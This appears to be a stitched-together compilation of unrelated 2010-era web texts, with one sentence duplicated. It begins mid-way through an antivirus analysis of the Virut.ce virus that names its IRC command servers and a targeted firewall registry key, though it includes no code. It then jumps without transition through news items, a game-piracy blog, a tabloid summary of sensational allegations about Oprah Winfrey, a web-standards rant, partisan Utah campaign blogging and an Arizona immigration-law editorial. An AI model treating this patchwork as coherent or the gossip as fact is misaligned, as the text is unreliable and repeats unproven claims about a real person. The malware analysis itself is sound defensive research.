The instructions used changed from version to version , but no clear trend can be observed : relatively simple algorithms were replaced by more complex ones , which in turn were replaced by simpler ones again .
It appears that the virus creator ’s ultimate goal was to use an algorithm that could better resist possible brute force attempts .
This may well account for the continuous changes to the algorithms , as well as the irrationality of those changes .
A disassembled fragment of the Main decryptor
The screenshot above contains a fragment of the Main decryptor ’s disassembled code .
The meaningful ( non-junk ) instructions discussed above are highlighted in red ovals .
Some junk operations are also present here for obfuscation purposes .
To continue the discussion regarding the execution of the infected file , let us move on to the execution of the malicious payload contained within the decrypted static body .
It typically starts with a CALL instruction to a nearby cell in order to calculate the virtual address of the beginning of the executable code and use it later on for addressing .
The virus ’ decrypted static body
The screenshot above shows the virus ’ decrypted static body .
The lines highlighted by the red ovals carry specific parts of the malicious payload .
For example , ‘ JOIN ’ and ‘ NICK ’ are IRC commands , ‘ irc.zief.pl ’ and ‘ proxim.ircgalaxy.pl ’ are remote IRC servers that Virut attempts to contact ; ‘SYSTEMCurrentControlSet ServicesSharedAccess ParametersFirewallPolicy StandardProfileAuthorizedApplications
List ’ is the registry key containing the list of trustworthy programs for the Windows firewall .
Conclusion
Virut.ce is interesting for the variety of file infection mechanisms that it uses , as well as its polymorphism and obfuscation techniques .
However , its malicious payload is quite commonplace .
This version of Virut was the first to combine all of the aforementioned malicious techniques into a single piece of malware .
Some malicious programs may be heavily obfuscated , others may employ a wide range of anti-emulation techniques , but Virut.ce combines all of these in one package .
This article provides a detailed account of these malicious techniques .
The article is not an attempt at a complete description of Virut.ce , nor is it intended to be .
We could have gone deeper into how the virus communicates with the IRC server , or examined more closely the details of how files are infected , but this time we deliberately dwelt on Virut ’s basic mechanisms .
Additionally , publishing a detailed description of the anti-emulation techniques would be irresponsible as malware writers could then exploit this information .
Assessing the virus ’ future is quite a difficult task .
As of April - May 2010 , no new versions of Virut.ce have been detected ; however , this does not mean that its evolution has stopped .
It is quite possible that the virus writers have taken a break in order to develop further changes to the virus that could render it immune to current antivirus products .
Currently , all of Kaspersky Lab ’s products are able to successfully detect and treat Virus .
Win32 .
Virut.ce and as soon as a new variant is detected , its signature will be added to the Kaspersky Lab antivirus databases .
We hope that this article will be of assistance to virus analysts and those interested in the study of malware .
These days , anti-emulation and anti-debugging techniques are commonly used in most malicious programs that propagate by means of server - side polymorphism .
An awareness of the technologies implemented in Virus.ce helps to broaden our understanding of many other malicious programs , including polymorphic viruses employing similar methodologies .

BOISE , Idaho � Police said a 74 - year - old woman arrested after pouring mayonnaise in the Ada County library 's book drop box is a person of interest in a yearlong spree of condiment - related crimes of the same sort .
The woman was arrested Sunday at the library , moments after police said she pulled through the outside drive - through and dumped an open jar of mayonnaise in the box designated for reading materials .
The woman was released from the county jail and faces a misdemeanor charge of malicious injury to property .
Police did not disclose a motive .
Boise police said the woman is under investigation for at least 10 similar cases of vandalism since May 2009 .
Library employees have reported finding books in the drop box covered in corn syrup and ketchup .
Last week , the Google logo was turned into a game of Pac - Man and we all took breaks to play .
In theory , we wasted a combined 4,819,352 hours and many , many dollars .
Here 's the math .
Advertisement
The Rescue Time Blog made these calculations based on observations and assumptions about the Google audience :
This weekend , we took a hard look at Pac - Man D - Day and compared it with previous Fridays ( before and after Google 's recent redesign ) and found some noticeable differences .
We took a random subset of our users ( about 11,000 people spending about 3 million seconds on Google that day )
The average user spent 36 seconds MORE on Google.com on Friday . [...]
If we take Wolfram Alpha at its word , Google had about 504,703,000 unique visitors on May 23 .
If we assume that our userbase is representative , that means : Google Pac - Man consumed 4,819,352 hours of time ( beyond the 33.6 m daily man hours of attention that Google Search gets in a given day )
$ 120,483,800 is the dollar tally , If the average Google user has a COST of $ 25 / hr ( note that cost is 1.3 – 2.0 X pay rate ) .
For that same cost , you could hire all 19,835 google employees , from Larry and Sergey down to their janitors , and get 6 weeks of their time .
Imagine what you could build with that army of man power .
$ 298,803,988 is the dollar tally if all of the Pac - Man players had an approximate cost of the average Google employee .

Of course all these numbers are assuming that the time we spent playing Google Pac - Man would 've been spent in some sort of productive manner in the first place .

Image caption Facebook says its members will have simplified user settings soon
Facebook founder Mark Zuckerberg has admitted that Facebook " missed the mark " over recent privacy concerns .
In a column in the Washington Post newspaper , he said the social network would soon make changes to users ' privacy options .
The move may placate some of the growing band of members who had pledged to quit the social network on 31 May .
" Sometimes we move too fast - and after listening to recent concerns , we 're responding , " wrote Mr Zuckerberg .
" The biggest message we have heard recently is that people want easier control over their information .
" Simply put , many of you thought our controls were too complex .
Our intention was to give you lots of granular controls ; but that may not have been what many of you wanted .
We just missed the mark , " he wrote .
The technology blogger Robert Scoble also published , with permission , an e-mail exchange with Mr Zuckerberg from the weekend , in which the Facebook CEO admitted " we 've made a bunch of mistakes " .
Privacy concerns
Facebook has faced increasing criticism from US civil liberties advocates , consumer groups and lawmakers .
European Union data protection officials described recent privacy changes as " unacceptable " .
Mr Zuckerberg 's admission also comes after Facebook said on Friday 21 May that it had changed how it shared data with advertisers on the site .
The Wall Street Journal had highlighted how under certain circumstances Facebook had been sending the user name or ID of the person clicking on an advert to the relevant advertiser .
" We fixed this case as soon as we heard about it , " a Facebook spokesperson told the Wall Street Journal .
Mr Zuckerberg did not offer a date on which the new settings would be implemented , but said the social network was " working hard to make these changes available as soon as possible " .
However , it remains to be seen whether Facebook has done enough to change the minds of a growing band of users who had said they would quit the social network .
The quitfacebookday website records that more than 13,500 Facebook members have committed to deleting their profiles on 31 May 2010 .
Mr Chahal said local pigeon fanciers in the sensitive border area had told police that Pakistani pigeons were easily identifiable as they look different from Indian ones , according to the Indian Express newspaper .
On May 6 , famous blogger , William Long , was summoned by the Shenzhen Urban Planning and Land Supervision Division that a Google Earth picture indicating military facilities at www.moon-bbs.com is in suspect of leaking national secret .
During the conversation , someone recorded the whole process with video .
After the meeting , the blogger deleted the article and turned the website off - line .
However , on 1７ of May , CCTV 's program “ Topics in Focus ” put the case under national spotlight .
Netizens speculated that the government is about to introduce a set of policy for restricting the use of “ Google Earth ” .
Jason
Ng from Kenengba estimated from past experience that within 10 days , the policy will be introduced .
In the CCTV program , apart from military facilities , electricity plants , water conservancy and electric power facilities , communication facilities and other facilities related with national economic and social interest are considered as national secret and should not be indicated in the online satellite map .
According to the existing law , the leaking of national secret , with or without intension , will be subjected to 3 - 7 year imprisonment .
For serious case , the penalty would be up to 5 - 10 year imprisonment .
We 've been hearing a lot about game piracy recently , with big developers inflicting draconian online - only DRM systems on their users , and blaming their declining PC game sales entirely on piracy .
I 'm not questioning that piracy is common , since even honest , DRM - free , indie developers like 2DBoy [ 1 ] report a 90 % piracy rate .
I am , however , questioning what this means .
How much revenue are developers actually losing to piracy ?
The common industry assumption is that developers are losing 90 % of their revenue .
That is , pirates would have bought every single game that they downloaded .
From personal experience , I know this is not possible -- most pirates that I 've met have downloaded enough software to exceed their entire lifetime income , were they to have paid for it all .
A more plausible ( but still overly optimistic ) guess is that if piracy was stopped the average pirate would behave like an average consumer .
This means that to calculate the worst - case scenario of how much money is lost to piracy , we just need to figure out what percentage of the target market consists of pirates .
For example , if 50 % of the market is pirates , that means that it 's possible that you 've lost 50 % of your revenue to piracy .
So how do we calculate what percentage of the market consists of pirates ?
Do we just go with 90 % ?
i Phone piracy
i Phone game developers have also found that around 80 % of their users are running pirated copies of their game ( using jailbroken phones ) [ 2 ]
This immediately struck me as odd -- I suspected that most iPhone users had never even heard of ' jailbreaking ' .
I did a bit more research and found that my intuition was correct -- only 5 % of iPhones in the US are jailbroken . [ 3 ]
World - wide , the jailbreak statistics are highest in poor countries -- but , unsurprisingly , iPhones are also much less common there .
The highest estimate I 've seen is that 10 % of worldwide iPhones are jailbroken .
Given that there are so few jailbroken phones , how can we explain that 80 % of game copies are pirated ?
The answer is simple -- the average pirate downloads a lot more games than the average customer buys .
This means that even though games see that 80 % of their copies are pirated , only 10 % of their potential customers are pirates , which means they are losing at most 10 % of their sales .
If you 'd like to see an example with math , read the following paragraph .
If word problems make your eyes glaze over , then I advise you to skip it .
Let 's consider the following scenario .
Because game pirates can get apps for free , they download a couple new games every day -- or about 500 games in a year .
On the other hand , normal gamers tend to play the same game for a longer time -- buying an average of 5 games per year .
If this seems low to you , then consider that you are also reading a post on an indie game developer blog .
You are probably more hardcore than the average gamer .
Anyway , given these statistics , if the market consists of 10 million gamers , then there are 500 million pirated game copies , and 90 million purchased game copies , From the perspective of every individual game , 80 % of its users are using pirated copies .
However , only 10 % of the market consists of pirates .
PC game piracy
Does this also apply to PC ( Windows / Mac / Linux ) gamers ?
Many PC game developers find that about 90 % of their users are running pirated copies -- does this mean that piracy is killing PC games ?
Let 's try our alternative explanation , and see if these statistics are possible even if only 20 % of worldwide PC gamers are pirates .
The average PC gamer worldwide only buys about three games a year , and plays them for a long time [ 4 ] .
I buy many more than that , and you probably do too , but again , we are not average gamers !
On the other hand , game pirates might download a new game every few days , for a total of about 125 games a year .
Given these numbers , games would see 90 % piracy rates even though only 20 % of gamers are pirates .
Are these numbers accurate ?
The NPD recently conducted an anonymous survey showing that only 4 % of PC gamers in the US admit to pirating games [ 5 ] , a number that is comparable to XBox 360 piracy statistics [ 6 ] .
However , since piracy is inversely proportionate to per-capita GDP , we can expect piracy rates to increase dramatically in places like Russia , China and India , driving up the world - wide average .
Let 's say to 20 % .
This means that if all pirates would otherwise buy as many games as the average consumer , then game developers would be losing 20 % of their revenue to piracy .
But would pirates really buy games ?
Anecdotally and from studies by companies like the BSA , it 's clear that pirates for the most part have very little income .
They are unemployed students , or live in countries with very low per-capita GDP , where the price of a $ 60 game is more like $ 1000 ( in terms of purchasing power parity and income percentage ) .
When Reflexive games performed a series of experiments with anti-piracy measures , they found that they only made one extra sale for every 1000 pirated copies they blocked [ 7 ] .
This implies that their 90 % piracy statistic caused them to lose less than 1 % of their sales .
Why are PC games really losing sales ?
While many game developers blame piracy for their decreasing PC game sales , it is clear that this is not the problem -- relatively few gamers are pirates , and those that are would mostly not be able to afford games anyway .
However , it 's easier for these developers to point their fingers at pirates than to face the real problem : that their games are not fun on PC .
The games in question are usually designed for consoles , with the desktop port as an afterthought .
This means they are not fun to play with a mouse and keyboard , and do n't work well on PC hardware .
Their field of view is designed to be viewed from a distant couch instead of a nearby monitor , and their gameplay is simplified to compensate for this tunnel vision .
Blizzard is one of the most successful game developers in the world , and it develops exclusively for desktop computers .
Why do they succeed where everyone else fails ?
They create games that are designed from the beginning to work well with the mouse and keyboard , and with all kinds of desktop hardware .
If developers spent more time improving their PC gaming experience , and less time complaining about piracy , we might see more successful PC games .
With the Humble Indie Bundle promotion we 've seen that when we treat gamers as real people instead of criminals , they seem to respond in kind .
Anyone can get all five DRM - free games for a single penny , and pirate them as much as they want -- we have no way to find out or stop it .
However , in just the first two days , we have over 40,000 contributions with an average of $ 8 each !
Would we have seen this much support if the games were console ports that only worked when connected to a secure online DRM server ?
We 'll never know for sure , but somehow I doubt it .
A SHOCK new biography claims Oprah Winfrey had secret lesbian affairs and her production company is run like a cult .
Winfrey - who built a billion - dollar empire persuading celebrities down to members of the public to reveal the truth about themselves - is a " big phony : " when it comes to her own past , an explosive new book charges .
Fox news reports that Kitty Kelley 's latest unauthorised biography " Oprah " details how :
Winfrey concocted stories about sexual abuse she suffered as a child - and grossly exaggerated the poverty she was brought up in .
She went to great lengths to conceal her " lesbian affairs " - including hefty payouts - and publicly attached herself to Graham to appear more normal to her audience of housewives .
She lavished romantic gifts - including a diamond toe ring - on ABC talking head Diane Sawyer .
Winfrey sold her body to earn extra money and has even described herself as a teen " prostitute . "
She does n't know the true identity of her biological father .
Her relationship with her own mother is so cold that Winfrey wo n't even let the older woman have her phone number .
Winfrey was born in Kosciusko , Miss. , in 1954 , and , the way she likes to tell it , she was so impoverished that she never had any new dresses or dolls and had to adopt two cockroaches as pets , naming them Melinda and Sandy .
But her family says that 's nonsense .
She may not have been well off , but Oprah was relatively " spoiled " as a little girl , her cousin said .

Perceptions of the web are changing .
People are advocating that we treat the web like another application framework .
An open , cross-platform , multi-device rival to Flash and Cocoa and everything else .
I ’m all for making the web richer , and exposing new functionality , but I value what makes the web weblike much , much more .
The last few days have been tough for web evangelism .
Or at least , tough for those of us who like to be regarded as level - headed .
First , HP purchased Palm , and immediately declared their commitment and belief in WebOS .
A great move for both companies for sure , but cue comments like that of @bgalbs on Twitter : “ The biggest tech company just bet its mobile strategy on the web ” .
Similarly , Joe Hewitt proffered “ Hopefully we ’ll look back on today as the day the mobile web began to eclipse proprietary mobile platforms . ” .
Meanwhile , the feuding between Apple and Adobe regarding Flash on iPad took an unexpectedly public twist , with Steve Jobs writing at length everything that John Gruber had already described about defending his platform from third - party influence , but also that Apple are choosing to invest in native running open standards .
Jobs incorrectly brands this ‘ HTML5 ’ .
He also criticises Flash for being proprietary whilst evangelising the H.264 video codec ( licensing for H.264 is not ‘ open ’ , either . )
Adobe hustled a number of responses .
Rapidly , a live interview with CEO Shantanu Narayen .
Whilst everyone mentioned so far is guilty of muddying terminology , not saying exactly what they think they mean , and / or some general platform and framework - related confusion that I ’ll elaborate on below , Mr Narayen is the first to throw some incomprehensible bullshit into the day .
He refers to “ open content ” .
What is that ?
Content wrapped inside an impenetrable , proprietary , single - vendor container format ?
Flash , by design , locks content away ( in exchange for other supposed benefits . )
Comments like “ Flash is an open specification ” is unhelpful too :
The page hosting the Flash specification does n’t specify a license , the document itself just exerts copyright and disclaimers on behalf of Adobe .
Furthermore there are no native or competing implementations of Flash , nor is the development of Flash open to participation .
Adobe has for years relied on bullshit merchandise to remain relevant in the ‘ future of the web ’ debate .
Three years since the launch of the iPhone visibly snubbed them , they have not shipped an acceptable , functional version of Flash on any other handset .
If the upcoming Android release does n’t perform well , there will be no reprieve .
Web Evangelism got hard .
When Zeldman wrote Designing With Web Standards , there were two standards that mattered : HTML and CSS .
They were the path to cross - browser compatibility , and thus they were the route to a brighter future ( both for design , and for information publishing . ) 12 years later , holy shit .
JavaScript joined the standards party , and then became quickly obfuscated by frameworks .
CSS3 stablised , Webkit extended CSS further ( and it ’s still called CSS3 ) , a plethora of new standards on the server and client : OAuth , OpenID , Contacts , Connect , Geolocation , microformats , widgets , AJAX , HTML5 , local storage , SPDY , ‘ The Cloud ’ …
All of these things are vying for attention and evangelism .
Some of them are great , some of them are stupid , but they ’re all clubbed together under this vague banner of ‘ The Open Web ’ .
It sets expectations and demands from developers , who are all the while being wowed by the efficiency and quality of proprietary application frameworks like Flash and Cocoa .
There exists on the web a collective memory problem .
It ’s a famous fault in software engineers to instinctively favour reinvention over reuse , not just because they are unfamiliar with what came before , but because they misunderstand why it came before .
This is a rule that is important to understand , so that it can be broken .
It is not well understood , yet it is regularly broken .
Besides memory , the half - life of most things on the internet is short .
Frustratingly , terminology is no exception .
From the coinage , we lose meaning and specificity within a few years , sometimes only a matter of months .
‘ HTML5 ’ now refers to a collection of related client - side technologies , branded together as a product .
It is no -longer just a hypertext specification document , and everything that concerns document semantics is being ignored anyway .
This is usage that Steve Jobs employed this week .
‘ Open ’ is lost .
• The H.264 video codec is not open .
It is patent encumbered , and there is a financial obstacle to license those patents .
Yet , despite this , H.264 is bundled in with discussion of an open web stack .
In practice it may be ‘ open enough ’ to function on the web .
Operating Systems and Browsers will license it for playback , and the authority that grants the licenses is continuing to allow free ( as in beer ) usage of the codec by web publishers .
But a change to those terms , and eventual enforcement of fees on big publishers is possible .
• Adobe are certainly full of shit here , though .
Absolutely full of it that it makes me angry .
‘ Open content ’ ?!
Locked up inside Flash containers ?
That ’s as closed as can be .
At least if you uploaded it as a flat image you could run content through OCR it and recover the text !
Let ’s not get stated on their open screen project .
To Adobe , ‘ open ’ means ‘ cross platform , on platforms that Adobe provides support for , for as long as Adobe chooses to support them . ’
That ’s very different .
Their use of ‘ open ’ is an outright lie .
Then , there ’s ‘ web ’ .
On this word rests most of our understanding ( and misunderstanding ) of what can and ca n’t be reasonably achieved with applications in the browser , over HTTP .
What does it mean to be a ‘ web application ’ ?
What are the expectations of a web application ?
Or of any web content , for that matter ?
Off the back of the Apple verses Adobe mudslinging , Joe Hewitt went on a very , very long rant about the state of ‘ the web ’ as an application platform .
In parts , I agree , certainly with regard to the process of standardisation .
Standards are supposed to be derived from implementation , and standardised technologies will be better for real - world iteration .
Heck , our entire microformats process is based around codifying examples in the wild .
The failure of CSS to define a layout syntax ( choose from three ) illustrates the need for implementations to lead .
However , the suggestion that Microsoft were bullied out of innovating the web , or that developers should pursue whizz - bang APIs to the point of single - browser dependency leaves me sour .
This is the short , perhaps selective memory that the internet suffers from .
It is not acceptable to me that 21st century knowledge retention has become so short and shallow as to be overwritten by influential ranting on Twitter .
A greater tool for the dissemination of misinformation has never been known .
For those too young to remember , IE was innovating like crazy from 4.0 –6.0 , right up until the DOJ and web standards commies intervened .
Microsoft Internet Explorer did not stop innovating because of ‘ standards commies ’ .
That ’s offensive and wrong .
Web standards advocates went after Microsoft because they failed to adequately support basic , foundational web standards like CSS , necessary to publish an interoperable web of information in which Firefox and KHTML and everyone else could even compete , let alone succeed .
That early CSS push was also a vital , huge step in making web content universally accessible beyond visual media .
Microsoft ’s development of enhancements like ActiveX , and XMLHttpRequest were not being prepared to be standardised for the web with W3C participation , they were invented in such a way as to inject proprietary , Windows - only code into the web .
Tools not to make to web better , but to make it dependent on Microsoft .
Chris Wilson has since written more accurately about the plateau in IE development on his blog .
Contrast Microsoft ’s method in the 90’s to the more recent CSS efforts coming out of Webkit : Extensions to CSS are followed promptly by proposed specifications ( such as CSS Animations ) .
Microsoft , from the top down were trying to ‘ own ’ the web .
( More recently , to their immense credit , they ’re in the right game .
The aforementioned CSS Grid Layout module is from Microsoft engineers . )
Meanwhile , Sachin Agarwal is writing that The Web Sucks , again talking about the web as an application platform :
Web applications do n’t have threading , GPU acceleration , drag and drop , copy and paste of rich media , true offline access , or persistence .
Are you kidding me ?
There , in that quote , is where I want to pull all of this together .
Sachin ’s complaint has absolutely nothing to do with the web .
Think about that word ; ‘ web ’ .
Think about why it was so named .
It ’s nothing to do with rich applications .
Everything about web architecture ; HTTP , HTML , CSS , is designed to serve and render content , but most importantly the web is formed where all of that content is linked together .
That is what makes it amazing , and that is what defines it .
This purpose and killer application of the web is not even comparable to the application frameworks of any particular operating system .
That ’s the kicker .
We talk about ‘ web applications ’ , the ‘ open web stack ’ .
People are citing HP ’s purchase of Palm and investment in WebOS as a victory for the web .
We talk about applications built using HTML , CSS and JavaScript in the same breath as content published using HTML semantics .
Want to know if your ‘ HTML application ’ is part of the web ?
Link me into it .
Not just link me to it ; link me into it .
Not just to the black - box frontpage .
Link me to a piece of content .
Show me that it can be crawled , show me that we can draw strands of silk between the resources presented in your app .
That is the web :
The beautiful interconnection of navigable content .
If your website locks content away in a container , outside the reach of hyperlinks , you ’re not building any kind of ‘ web ’ app .
You ’re doing something else .
Palm WebOS applications are awesome , but they are not part of the web .
An app might interact with data on the web , and they are built with similar HTML , CSS and JavaScript technologies .
That ’s great , but they are not a connected , interlinked part of the web .
We ’re talking about two very different things :
The web of information and content , and a desire for a free , cross- platform Cocoa or .NET quality application framework that runs in the browsers people already use .
The latter cause is louder , and risks stomping over the more valuable , more important , more culturally indispensable part of the web .
I ’m not saying that better , more abstracted JavaScript APIs are unwelcome .
I ’m not saying that APIs to access devices like webcams and microphones are n’t useful or even important .
Even WebGL , as far out of my field of interest as it is , would be a great thing .
But , the open publishing nature of the web , and the requirement that information be accessible , will inherently cause it to lag behind other platforms .
The success of the web , the success of this impossibly huge network of information is because of the open , universally accessible , cross-platform , cross - device nature of web content .
Cross - platform user interface sucks .
It ’s a nightmare of inconsistency and wrong , momentarily obsoleted assumptions .
But cross -platform content ?
Well that is content .
It ’s articles and poems and pictures and movies and music , everywhere !
How brilliant is that !
Calling for browsers to make massive proprietary advances ( even with the caveat of standardising later ) , suggesting that users should tolerate swapping between browsers , or even devices , to access particular content because you ’ve obscured it behind a bespoke API is an absurd throwback to days we ’ve left long behind ; a proposition that would result in information and culture being locked away .
Nothing is worth that , especially not ‘ web applications ’ .
If you reach the point of building a browser - based application that you depend on so many proprietary enhancements that your users can only access it using Google Chrome , I think you ’ve picked the wrong platform .
If you want to built the most amazing user interface , you will need to use native platforms .
A single vendor ’s benevolent curation of their framework will always outpace the collaborative , interoperable developments of the web , whether it ’s locked in a standards process or not .
When they do a good job ( like Apple have with CocoaTouch ) their platform will succeed .
But the web will always be the canonical source of information and relationships .
That ’s what it was built for .
Blogging at length about how much the device APIs suck wo n’t ever undo that , nor change the fact that turning HTML in a rich application dialect is still a very new idea .
Personally , aside from all of this almost ideological disagreement over what the web is for , and what you can reasonably expect it to be good at , I honestly think that ‘ Desktop - class Web Applications ’ are a fools folly .
Java , Flash , AIR and QT demonstrate right now that cross-platform applications are always inferior to the functionality and operation of the native framework on a host platform .
Steve Jobs is right in his comments that third - party frameworks are an obstacle to native functionality .
Creating generic , non-native interfaces that run in a web browser wo n’t be any better than the cross- platform applications that came before ( see Cappucino . )
The idea of undermining the core function of the web to achieve that is detestable .
The popularity of bottled chewing gums is accompanied by people ' having to ' pollute the environment .
Therefore , I designed a kind of gum bottle that can help people package chewed gum and throw away later -- an invention that help people achieve their environmental - friendly selves .
I named it ' Green Seeds ' , because I believe that for the nature , less pollution equals more affection .

All Samsung Galaxy S Phones To Be Upgraded To Android 2.2
Samsung has promised to launch its Galaxy S smartphone on each of the top four carriers in the United States under a different name .
For T - Mobile , they will launch the Samsung Vibrant .
AT&T will launch the Samsung Captivate .
Sprint will launch the Epic 4G .
Verizon will launch the Samsung Fascinate .
All four phones share a couple of main features such as a 4 inch Super AMOLED display , a 1 GHz Hummingbird Cortex A8 processor , and a camera that captures 720 p .
In addition , every phone will initially run on Android 2.1 .
Samsung could have made a lot of buzz by announcing that all four phones will run Android 2.2 out of the box , but instead Samsung reported all four phones will be upgraded to Android 2.2 later on .
The announcement came at their press event today , but they also tweeted the information .
The message can be read below :
Galaxy S phones will come with Android 2.1 and be upgradeable to Android 2.2 which will support Adobe Flash 10.1
All we can hope for at this point is for Samsung to upgrade every phone to Android 2.2 as soon as possible after it launches .
Of course , all the phones are equipped with Samsung TouchWiz 3.0 , so it might take a little longer to make Android 2.2 work with it .
So what about Claudia ?
Well , how about this ?
She 's Brigham Young 's great great granddaughter !
And she left the Mormon Church .
And she 's openly gay and living with her partner .
And , better yet , she 's a brilliant woman with a solidly Democratic platform that shows Matheson is really nothing but a tarted - up Republican in a blue jersey !
Can she beat Matheson ?
Wright , a retired high school teacher and college gender - studies instructor , fought a spirited campaign at convention to assure delegates she is electable in a district that Matheson 's backers said is too conservative for her .
Liberal Salt Lake City Democrats had chosen her to challenge Matheson after his vote against the health care reform bill , pushed by President Barack Obama .
Wright went room - to - room in the morning caucuses at the Salt Palace Convention Center telling delegates that Republicans have become so radical in their nominating process that some of their party members will consider Democrats , including her .
" The Republican Party has moved so far right that those Republicans who are moderate are seriously considering becoming Democrats , " Wright said in the morning to the Stonewall Democrats , a gay - rights caucus .
" This election belongs to whoever can get voters out to vote , " she said .
... " I get it , " Matheson told the crowd , not long after dozens of them had held up signs for his opponent and chanted , " Wright for Utah ! "
" You 're angry about some of my votes , " he said , drawing some ironic applause .
" But I 'm a Democrat and I 'm here to tell you I do n't run from that label , because it 's in my blood . "
Wright also was battling a powerful Matheson advocate in U.S. House Majority Leader Steny Hoyer ( D - MD ) .
He said Matheson had invited him to Utah , and he came to help re-elect him and keep the Democratic majority in Congress .
Hoyer made a pragmatic pitch to delegates , saying that only Matheson can win in the moderately conservative 2nd Congressional District and that he is important to the majority even if he does n't vote strictly along party lines .
" I expect members of Congress to come and represent their districts , " he said in a news conference .
He contrasted Democrats ' " big tent " to the far - right Republicans who rejected three - term Sen.
Bob Bennett , R - Utah , and urged Democrats not to splinter in the same way .
" Jim Matheson is uniquely qualified and uniquely in touch with that district , " he said .
Not everyone in the district agrees .
Bush won UT - 02 both times with two - thirds of the votes , but in 2008 Obama held McCain to 57 % .
Perhaps even more important , moderate Republicans are repulsed by what they 've seen their party turn into .
This is n't just a party of teabaggers ; this is a full - on fascist party of crazed militia loons and separatists .
If Wright wins the Democratic nomination , she can win the election -- and Democrats are ready for a real Democrat .
On the issues , there 's no question who the real Democrat is .
Wright supports Alan Grayson 's proposal of Medicare for all , supports women 's choice , plain and simple .
She 's an environmentalist ; he voted against the American Clean Energy and Security Act of 2009 , promoting clean energy and limiting emissions of greenhouse gases , and he voted against HR2454 ( cap and trade ) .
Claudia is a strong advocate of a humane and comprehensive immigration policy ; Matheson is all about building a high border fence .
Claudia supports public funding for campaigns , and Matheson is another sleazy conservative , taking immense sums of money from the industries and corporations he 's supposed to be overseeing .
And of course he's a vicious homophobe who voted for a constitutional amendment to ban marriage equality .
Claudia believes people should have the right to marry whomever they want to .
It will probably come as no surprise that Blue America immediately added her to

It will probably come as no surprise that Blue America immediately added her to our Bad Dogs page , dedicated to replacing reactionary Blue Dogs with progressive Democrats .
I hope you 'll join me in supporting her there .
I 'm finished bashing Utah .
Over !
Done !
A hearty band of awesome Democrats there put their collective foot down and prevented anti-healthcare Blue Dog Jim Matheson from winning the party endorsement at yesterday 's convention in Salt Lake City .
No morejokes for me .
Matheson is one of the most reactionary Democrats in Congress , consistently crossing the aisle to vote with the Republicans on key issues .
Since Obama was elected , his ProgressivePunch score -- a dismal 35.37 -- has been identical to those of two of the most unsavory of the Old South Blue Dogs , John Barrow ( GA ) and Mike Ross ( AR ) .
And , like Barrow and Ross , he left the Democratic Party to vote for the anti-choice Stupak Amendment and against healthcare reform .
Now Utah Democrats are sick enough of the ten - year incumbent to say no .
Sensing that retired school teacher Claudia Wright was making headway , Matheson put in a hysterical call begging Steny Hoyer to fly out to Salt Lake City to save him .
Hoyer did fly out , and begged and cajoled delegates to vote for Matheson , but ultimately failed to secure the party endorsement for him .
He came up 5 % short of the 60 % needed .

A fundamental principle of law is that it should protect the innocent .
Of all the damage made possible by Gov. Jan Brewer 's signature on Friday to Senate Bill 1070 , the worst is not the harm to the world 's judgment of Arizona or to this law 's economic consequences .
The worst effect is its grave potential for causing harm to innocent , taxpaying American citizens who no longer can feel certain of the law 's blindness .
That is the terrible harm of it .
SB 1070 lifts the blindfold of Lady Justice and commands her to see one different from the other , irrespective of innocence .
Brewer 's televised signing ceremony for this harsh , unnecessary legislation constitutes the low point of an administration we have come to admire for its often surprising grit in the face of hard times .
We held out hope for more .
Whether Arizona pays a price for indulging the whims of state Sen. Russell Pearce , R - Mesa , is no longer the issue .
We are paying a price .
Not since the dismal days of our nationally infamous fight over a holiday to honor the Rev. Martin Luther King Jr. , has the profile of Arizona descended this low .
It is n't as though the potential consequences of this law are unapparent .
We have been down this road before .
The terrible " Chandler Roundup " of 1997 still stands as a warning of what may lie ahead .
Then , like now , local police officers demanded proof of citizenship of people they suspected might be in this country illegally .
Scores of American citizens lacking " papers " were cuffed .
An international outrage erupted .
SB 1070 opens the door to the return of those brutal neighborhood - dividing days .
Also Friday , Brewer signed an executive order to establish law - enforcement training she hopes might mitigate the worst potential effect of SB 1070 , racial profiling .
A nice gesture , certainly .
But a few hours of additional training is unlikely to alter the now - evolving relationship of local police to their citizenry , a relationship made infinitely more difficult and attenuated by the signing of SB 1070 .
We are not blind to the political challenge facing Brewer .
She is a Republican facing stiff competition in an approaching election , and not signing SB 1070 likely would have doomed her candidacy .
That is her political problem , however .
Not Arizona's .
She is certainly correct on one count .
The widespread popularity of this punishing legislation would be far weaker if Washington , D.C. , would act seriously to do its duty regarding Arizona 's southern border .
This is very bad law .
And this is not the end of the fight against it .

Pope Benedict made the comments during a mass in the Vatican Pope Benedict XVI has called on Roman Catholics to " do penance " for their sins , an apparent reference to the recent child sexual abuse scandal .
He said Catholics were " under attack from the world which talks to us of our sins " and should see the necessity " to recognise what is wrong in our lives " .
In was the Pope 's first reference to the abuse scandal for nearly a month .
Later , German bishops said they would revise their abuse guidelines to bring in prosecutors early to investigate .
Justice Minister Sabine Leutheusser - Schnarrenberger earlier told the head of the German Bishops Conference , Archbishop Robert Zollitsch , that internal church investigations must not hinder prosecutors ' work .
The existing guidelines dating back to 2002 state that accused priests are advised to contact the authorities on their own in " proven cases " of abuse , and that Church leaders are not required to do so .
On Monday , the Vatican published what it said was a long - standing Church policy telling bishops that they should report abuse cases to police .
But critics said the move was an attempt to rewrite history .
Penance ' a grace '
Speaking during a homily at a private mass at the Vatican on Thursday , Pope Benedict appeared to make his first reference to the issue since 20 March , when he sent a letter to the Irish people about the abuse scandal in their country .
Conformism which makes it obligatory to think and act like everyone else , and the subtle - or not so subtle - aggression towards the Church , demonstrate how this conformism can really be a true dictatorship
Pope Benedict XVI
" I must say , we Christians , even in recent times , have often avoided the word ' repent ' , which seemed too tough , " he said .
" But now , under attack from the world which talks to us of our sins , we can see that being able to do penance is a grace and we see how necessary it is to do penance and thus recognise what is wrong in our lives . "
The Pope said this involved " opening oneself up to forgiveness , preparing oneself for forgiveness , allowing oneself to be transformed " .
The BBC's David Willey in Rome says the words were generic , but his meaning was clear - the gravity of the scandal harms all Christians .
Pope Benedict also used the opportunity to hit back at critics of the Church , portraying them as in the thrall of a conformist dictatorship .
" Conformism which makes it obligatory to think and act like everyone else , and the subtle - or not so subtle - aggression towards the Church , demonstrate how this conformism can really be a true dictatorship , " he said .
' Unjust attacks '
On Monday , the Vatican 's Secretary of State , Cardinal Tarcisio Bertone , outraged gay rights groups worldwide saying it was homosexuality - not the Church 's celibacy - which lay behind the abuse of minors .
A series of allegations of abuse by priests has put pressure on the Pope The Vatican sought to " clarify " the remarks on Wednesday , saying the Church was not trying to make assertions of a " psychological or medical nature " .
Earlier this month , the Pope 's personal preacher was forced to apologise for having highlighted a comparison between criticism of the Church over the abuse allegations and " the collective violence suffered by the Jews " .
